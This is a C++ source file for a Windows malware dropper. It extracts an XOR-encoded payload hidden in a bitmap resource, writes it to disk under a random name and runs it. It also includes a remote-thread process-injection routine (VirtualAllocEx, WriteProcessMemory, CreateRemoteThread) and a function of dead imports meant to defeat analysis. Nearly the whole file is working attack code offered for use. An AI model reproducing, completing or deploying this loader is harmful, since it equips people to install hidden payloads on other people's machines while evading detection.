#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <windows.h>
#include "resource.h"

// Enhanced Dropper with Custom Payload Injection
// Based on Marcus Botacin's original dropper framework
// Modified to inject custom payload into target process

// Enhanced Dropper with Custom Payload Injection
// Based on Marcus Botacin's original dropper framework
// Modified to inject custom payload into target process
// Add necessary library for UUID functions
// Add necessary libraries for Windows API 



#pragma comment(lib, "Rpcrt4.lib")   // For UUID functions
#pragma comment(lib, "Shell32.lib")   // For Shell functions
#pragma comment(lib, "Advapi32.lib")  // For Registry functions
#pragma comment(lib, "Ole32.lib")     // For COM functions

#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <time.h>
#include <cstdint>
#include <vector>
#include <stdexcept>
#include <algorithm>
#include <random>
#include <numeric> // Add this for std::iota
#include "resource.h"


// Load payload from bitmap resource
#pragma optimize("", off)
std::vector<uint8_t> extract_payload_from_bitmap(
	size_t payload_size,
	uint32_t key,
	unsigned int black_pixel_seed = 12345
) {
	// Load bitmap resource as raw bytes
	HINSTANCE hInstance = GetModuleHandle(NULL);
	HRSRC hResource = FindResource(hInstance, MAKEINTRESOURCE(IDB_BITMAP1), RT_BITMAP);
	if (!hResource) {
		DWORD error = GetLastError();
		char errMsg[256];
		sprintf(errMsg, "Failed to find bitmap resource. Error code: %lu", error);
		throw std::runtime_error(errMsg);
	}

	DWORD resourceSize = SizeofResource(hInstance, hResource);
	HGLOBAL hMemory = LoadResource(hInstance, hResource);
	if (!hMemory) {
		throw std::runtime_error("Failed to load bitmap resource");
	}

	// Lock the resource and get a pointer to the bitmap data
	BYTE* bitmapData = static_cast<BYTE*>(LockResource(hMemory));
	if (!bitmapData) {
		throw std::runtime_error("Failed to lock bitmap resource");
	}

	// Parse bitmap header (BITMAPINFOHEADER) - Resources don't have BITMAPFILEHEADER
	BITMAPINFOHEADER* bih = reinterpret_cast<BITMAPINFOHEADER*>(bitmapData);

	// Calculate dimensions
	int width = bih->biWidth;
	int height = abs(bih->biHeight); // Handle bottom-up or top-down bitmaps
	int bytesPerPixel = bih->biBitCount / 8;
	int headerSize = bih->biSize; // typically 40 bytes for BITMAPINFOHEADER

	// Ensure we have a 24-bit or 32-bit bitmap (3 or 4 bytes per pixel)
	if (bytesPerPixel < 3) {
		throw std::runtime_error("Bitmap must be 24-bit or 32-bit");
	}

	// Pixel data starts after the header and color table (if any)
	BYTE* pixelData = bitmapData + headerSize;
	if (bih->biClrUsed > 0) {
		// Skip color table if present
		pixelData += (bih->biClrUsed * sizeof(RGBQUAD));
	}

	// Calculate row padding (rows are aligned to 4-byte boundaries)
	int padding = (4 - ((width * bytesPerPixel) % 4)) % 4;

	// Create containers for the separate RGB channel data
	std::vector<uint8_t> redChannel;
	std::vector<uint8_t> greenChannel;
	std::vector<uint8_t> blueChannel;

	printf("Image data extracted\n");

	// Extract data from each pixel
	for (int y = 0; y < height; y++) {
		for (int x = 0; x < width; x++) {
			// Handle bottom-up vs top-down bitmap orientation
			int row = (bih->biHeight > 0) ? (height - 1 - y) : y;
			int pixelPos = row * (width * bytesPerPixel + padding) + x * bytesPerPixel;

			// Extract RGB values (bitmap format is BGR)
			uint8_t blue = pixelData[pixelPos];
			uint8_t green = pixelData[pixelPos + 1];
			uint8_t red = pixelData[pixelPos + 2];

			// Add to respective channel vectors
			blueChannel.push_back(blue);
			greenChannel.push_back(green);
			redChannel.push_back(red);
		}
	}

	// Continue with your existing XOR decryption for the channels
	for (size_t i = 0; i < redChannel.size(); ++i) {
		redChannel[i] = redChannel[i] ^ 50;
	}
	for (size_t i = 0; i < greenChannel.size(); ++i) {
		greenChannel[i] = greenChannel[i] ^ 100;
	}
	for (size_t i = 0; i < blueChannel.size(); ++i) {
		blueChannel[i] = blueChannel[i] ^ 200;
	}

	printf("Extracted %zu bytes from Red channel\n", redChannel.size());
	printf("Extracted %zu bytes from Green channel\n", greenChannel.size());
	printf("Extracted %zu bytes from Blue channel\n", blueChannel.size());

	// Rest of the function remains unchanged...
	size_t startIndex = 0;
	// Find the first non-black pixel
	while (startIndex < redChannel.size() &&
		redChannel[startIndex] == 0 &&
		greenChannel[startIndex] == 0 &&
		blueChannel[startIndex] == 0) {
		startIndex++;
	}

	// Remove only the black pixels from the beginning
	if (startIndex > 0) {
		redChannel.erase(redChannel.begin(), redChannel.begin() + startIndex);
		greenChannel.erase(greenChannel.begin(), greenChannel.begin() + startIndex);
		blueChannel.erase(blueChannel.begin(), blueChannel.begin() + startIndex);

		printf("Removed %zu black pixels from the beginning\n", startIndex);
	}

	// Combine channels and apply decryption key
	std::vector<uint8_t> payload;

	for (size_t i = 0; i < greenChannel.size(); i++) {
		payload.push_back(greenChannel[i]);
	}
	bool isOddByteCount = redChannel[redChannel.size() - 1] == 0;

	size_t blueLength = blueChannel.size();
	if (isOddByteCount) {
		blueLength -= 1; // Exclude last byte if odd
	}

	for (size_t i = 0; i < blueLength; i++) {
		payload.push_back(blueChannel[i]);
	}

	return payload;
}

// Rest of the code remains unchanged
// Function prototypes
void dead();
void drop_payload(const std::vector<uint8_t>& payload);
void* XOR(void* data, int size);
void* base64decode(void* data, DWORD* size);
void launch();
void set_name();
DWORD find_process(const char* process_name);
bool inject_into_process(DWORD pid, const std::vector<uint8_t>& payload);

// Configuration flags
#define DEAD_IMPORTS
#define XOR_KEY 0x73
#define RANDOM_NAME
#define NAME_SIZE 10
//#define INJECT_MODE

// Global variables
char dll_name[10 * NAME_SIZE];
std::vector<uint8_t> global_payload;

int main()
{



	// Extract payload from steganographic bitmap
	// Replace these with your actual values
	size_t expected_payload_size = 10 * 1024 * 1024; // Adjust to your payload size
	uint32_t stego_key = 42; // Your steganography key

	try {
		global_payload = extract_payload_from_bitmap(expected_payload_size, stego_key);

		if (global_payload.empty()) {
			printf("Failed to extract payload from bitmap\n");
			return -1;
		}

		printf("Extracted %zu bytes from steganographic image\n", global_payload.size());

		// Set random DLL name
		set_name();

		// Drop payload to disk as DLL
		//drop_payload(global_payload);

		// Launch injection
		launch();

#ifdef DEAD_IMPORTS
		dead();
#endif

	}
	catch (const std::exception& e) {
		printf("Error: %s\n", e.what());
		return -1;
	}

	return 0;
}

void set_name()
{
#ifdef RANDOM_NAME
	int valid = 0;
	srand((unsigned int)time(NULL)); // Cast to unsigned int to avoid warning
	while (valid < NAME_SIZE) {
		char c = rand() % 26 + 'a'; // Generate lowercase letters
		dll_name[valid++] = c;
	}
	dll_name[valid] = '\0';
#else
	strcpy(dll_name, "payload");
#endif
	strcat(dll_name, ".exe");  // Changed from .dll to .exe
}


void drop_payload(const std::vector<uint8_t>& payload)
{
	FILE* f = fopen(dll_name, "wb");
	if (!f) {
		printf("Failed to create payload file\n");
		return;
	}

	// Write payload bytes to file
	fwrite(payload.data(), 1, payload.size(), f);
	fclose(f);

	printf("Payload dropped as: %s\n", dll_name);
}

void launch()
{
	// First, ensure the payload is written to disk
	drop_payload(global_payload);

	// Set up process creation structures
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	// Print what we're trying to execute
	printf("Attempting to execute: %s\n", dll_name);

	// Execute the EXE with specific flags for 32-bit compatibility
	BOOL result = CreateProcessA(
		dll_name,              // Path to the 32-bit EXE
		NULL,                  // No command line args
		NULL, NULL, FALSE,
		0,      // Don't create a console window
		NULL, NULL,
		&si, &pi
	);

	if (result) {
		printf("Process launched successfully!\n");
		// Wait for process to complete
		WaitForSingleObject(pi.hProcess, INFINITE);

		// Get exit code to verify execution
		DWORD exitCode;
		GetExitCodeProcess(pi.hProcess, &exitCode);
		printf("Process completed with exit code: %lu\n", exitCode);

		// Clean up handles
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	else {
		// Print detailed error information
		DWORD error = GetLastError();
		char errorMsg[256] = { 0 };
		FormatMessageA(
			FORMAT_MESSAGE_FROM_SYSTEM,
			NULL,
			error,
			0,
			errorMsg,
			sizeof(errorMsg),
			NULL
		);
		printf("Failed to launch process. Error %lu: %s\n", error, errorMsg);

		// Try alternative method: ShellExecute
		printf("Trying alternative execution method...\n");
		HINSTANCE result = ShellExecuteA(NULL, "open", dll_name, NULL, NULL, SW_SHOWNORMAL);
		if ((INT_PTR)result > 32) {
			printf("Alternative execution succeeded.\n");
		}
		else {
			printf("Alternative execution also failed with code: %d\n", (INT_PTR)result);
		}
	}
}

DWORD find_process(const char* process_name)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

	// Use the standard PROCESSENTRY32 type
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hSnapshot, &pe32)) {
		do {
			// Convert wide char process name to ANSI for comparison
			char exeName[MAX_PATH];
			WideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1,
				exeName, MAX_PATH, NULL, NULL);

			if (_stricmp(exeName, process_name) == 0) {
				CloseHandle(hSnapshot);
				return pe32.th32ProcessID;
			}
		} while (Process32Next(hSnapshot, &pe32));
	}

	CloseHandle(hSnapshot);
	return 0;
}

bool inject_into_process(DWORD pid, const std::vector<uint8_t>& payload)
{
	// Open target process
	HANDLE hProcess = OpenProcess(
		PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
		FALSE, pid
	);

	if (!hProcess) {
		printf("Failed to open process %lu\n", pid);
		return false;
	}

	// Allocate memory in target process
	LPVOID pRemoteCode = VirtualAllocEx(
		hProcess, NULL, payload.size(),
		MEM_COMMIT, PAGE_EXECUTE_READWRITE
	);

	if (!pRemoteCode) {
		printf("Failed to allocate memory in target process\n");
		CloseHandle(hProcess);
		return false;
	}

	// Write payload to target process
	SIZE_T bytesWritten;
	if (!WriteProcessMemory(hProcess, pRemoteCode, payload.data(),
		payload.size(), &bytesWritten)) {
		printf("Failed to write payload to target process\n");
		VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	// Create remote thread to execute payload
	HANDLE hThread = CreateRemoteThread(
		hProcess, NULL, 0,
		(LPTHREAD_START_ROUTINE)pRemoteCode,
		NULL, 0, NULL
	);

	if (!hThread) {
		printf("Failed to create remote thread\n");
		VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	// Wait for injection to complete (optional)
	WaitForSingleObject(hThread, 1000); // Wait 1 second

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return true;
}

// XOR decoding function (if payload is encoded)
void* XOR(void* data, int size) {
	void* buffer = malloc(size);
	for (int i = 0; i < size; i++) {
		((char*)buffer)[i] = ((char*)data)[i] ^ XOR_KEY;
	}
	return buffer;
}

// Base64 decoding function (if payload is encoded)
void* base64decode(void* data, DWORD* size) {
	// Implementation depends on your Base64 library
	// This is a placeholder - implement as needed
	return data;
}

// Dead code function (anti-analysis)
void dead()
{
	return;
	memcpy(NULL, NULL, NULL);
	memset(NULL, NULL, NULL);
	strcpy(NULL, NULL);
	ShellAboutW(NULL, NULL, NULL, NULL);
	//SHGetSpecialFolderPathW(NULL, NULL, NULL, NULL);
	//ShellMessageBox(NULL, NULL, NULL, NULL, NULL);
	RegEnumKeyExW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegOpenKeyExW(NULL, NULL, NULL, NULL, NULL);
	RegEnumValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegGetValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegDeleteKeyW(NULL, NULL);
	RegQueryInfoKeyW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegQueryValueExW(NULL, NULL, NULL, NULL, NULL, NULL);
	RegSetValueExW(NULL, NULL, NULL, NULL, NULL, NULL);
	RegCloseKey(NULL);
	RegCreateKey(NULL, NULL, NULL);
	BSTR_UserFree(NULL, NULL);
	//BufferedPaintClear(NULL, NULL);
	CoInitialize(NULL);
	CoUninitialize();
	CLSID x;
	CoCreateInstance(x, NULL, NULL, x, NULL);
	//IsThemeActive();
	//ImageList_Add(NULL, NULL, NULL);
	//ImageList_Create(NULL, NULL, NULL, NULL, NULL);
	//ImageList_Destroy(NULL);
	WideCharToMultiByte(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	lstrlenA(NULL);
	GetStartupInfoW(NULL);
	DeleteCriticalSection(NULL);
	LeaveCriticalSection(NULL);
	EnterCriticalSection(NULL);
	GetSystemTime(NULL);
	CreateEventW(NULL, NULL, NULL, NULL);
	CreateThread(NULL, NULL, NULL, NULL, NULL, NULL);
	ResetEvent(NULL);
	SetEvent(NULL);
	CloseHandle(NULL);
	GlobalSize(NULL);
	GlobalLock(NULL);
	GlobalUnlock(NULL);
	GlobalAlloc(NULL, NULL);
	lstrcmpW(NULL, NULL);
	MulDiv(NULL, NULL, NULL);
	GlobalFindAtomW(NULL);
	GetLastError();
	lstrlenW(NULL);
	CompareStringW(NULL, NULL, NULL, NULL, NULL, NULL);
	HeapDestroy(NULL);
	HeapReAlloc(NULL, NULL, NULL, NULL);
	HeapSize(NULL, NULL, NULL);
	SetBkColor(NULL, NULL);
	SetBkMode(NULL, NULL);
	EmptyClipboard();
	CreateDIBSection(NULL, NULL, NULL, NULL, NULL, NULL);
	GetStockObject(NULL);
	CreatePatternBrush(NULL);
	DeleteDC(NULL);
	EqualRgn(NULL, NULL);
	CombineRgn(NULL, NULL, NULL, NULL);
	SetRectRgn(NULL, NULL, NULL, NULL, NULL);
	CreateRectRgnIndirect(NULL);
	GetRgnBox(NULL, NULL);
	CreateRectRgn(NULL, NULL, NULL, NULL);
	CreateCompatibleBitmap(NULL, NULL, NULL);
	LineTo(NULL, NULL, NULL);
	MoveToEx(NULL, NULL, NULL, NULL);
	ExtCreatePen(NULL, NULL, NULL, NULL, NULL);
	GetObjectW(NULL, NULL, NULL);
	GetTextExtentPoint32W(NULL, NULL, NULL, NULL);
	GetTextMetricsW(NULL, NULL);
	CreateSolidBrush(NULL);
	SetTextColor(NULL, NULL);
	GetDeviceCaps(NULL, NULL);
	CreateCompatibleDC(NULL);
	CreateFontIndirectW(NULL);
	SelectObject(NULL, NULL);
	GetTextExtentPointW(NULL, NULL, NULL, NULL);
	RpcStringFreeW(NULL);
	UuidToStringW(NULL, NULL);
	UuidCreate(NULL);
	//timeGetTime();
	SetBkColor(NULL, NULL);
	free(NULL);
	isspace(NULL);
	tolower(NULL);
	abort();
	isalnum(NULL);
	isdigit(NULL);
	isxdigit(NULL);
	toupper(NULL);
	malloc(NULL);
	free(NULL);
	memmove(NULL, NULL, NULL);
	isalpha(NULL);
}

